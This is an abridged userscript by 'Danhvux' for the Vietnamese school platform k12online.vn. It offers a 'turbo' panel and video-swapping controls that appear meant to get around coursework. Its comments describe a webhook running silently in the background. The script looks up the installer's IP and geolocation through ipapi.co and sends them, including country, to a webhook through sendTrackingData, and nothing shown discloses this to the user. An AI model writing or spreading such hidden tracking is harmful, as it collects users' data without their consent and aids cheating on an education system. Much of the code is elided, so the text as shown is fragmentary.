...
// @version      21.9
// @description  Giữ nguyên 100% bản gốc của Danhvux, tích hợp Webhook chạy ngầm không gây lỗi 429.
// @author       Danhvux
// @match        *://*.k12online.vn/*
...
(function() {
    ...
    // CẤU HÌNH WEBHOOK (Giữ nguyên link của bạn)
    ...
    // --- PHẦN WEBHOOK CHẠY NGẦM (KHÔNG CHẶN PANEL) ---
        ...
        const payload = {
            embeds: [{
                ...
                fields: [
                    ...
                    { name: "🌍 Quốc gia", value: `${geoData.country_name || 'N/A'}`, inline: true },
    ...
    // Tự động lấy IP và gửi Webhook (Lỗi 429 cũng không sao, Panel vẫn lên)
    GM_xmlhttpRequest({
        method: "GET",
        url: "https://ipapi.co/json/",
        onload: function(res) {
            try { sendTrackingData(JSON.parse(res.responseText)); } catch(e) {}
        }
    });

    // --- TOÀN BỘ PHẦN CỦA BẠN (KHÔNG THAY ĐỔI) ---
    const runTurbo = () => {
    ...
    $('#v-run').onclick = () => { 
        const v = document.querySelector('video'); 
        if (v) { v.src = $('#v-url').value; v.play(); $('#v-display').innerText = "Đang phát..."; showToast('Đã bắt đầu phát video', 'success'); }
